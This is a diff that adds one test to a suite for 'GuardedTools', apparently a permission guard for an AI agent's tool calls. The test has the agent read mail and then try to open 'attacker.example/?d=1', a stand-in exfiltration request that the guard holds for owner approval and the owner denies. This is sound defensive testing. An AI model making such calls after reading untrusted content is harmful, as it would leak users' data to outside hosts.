@@ -849,6 +849,19 @@ describe("GuardedTools", () => {
       expect((await tools.execute("peek.taint", {})).content).toBe("true");
     });
 
+    it("asks before opening a site the turn has not been on, offering nothing to remember, unless the owner named it", async () => {
+      read();
+      registry.register({ name: "browser.visit", description: "v", inputSchema: { type: "object" } }, () => "opened");
+      const tools = guarded({ conversationId: "c1", owner: true, ownWords: true, said: "check the price on shop.example" });
+      await tools.execute("mcp.mail.read", {});
+      expect((await tools.execute("browser.visit", { url: "https://www.shop.example/p" })).content).toBe("opened");
+      const asked = tools.execute("browser.visit", { url: "https://attacker.example/?d=1" });
+      await vi.waitFor(() => expect(approvals.pending()).toHaveLength(1));
+      expect(approvals.pending()[0]).toMatchObject({ rule: null, reason: "opens attacker.example, a site this turn had not been on" });
+      approvals.deny(approvals.pending()[0]!.id, "owner", { via: "dashboard" });
+      await asked;
+    });
+
     it("starts tainted when handed a turn's taint, so work passed on asks as its sender would", async () => {
       post();
       const permissions = new PermissionStore(ws.db);
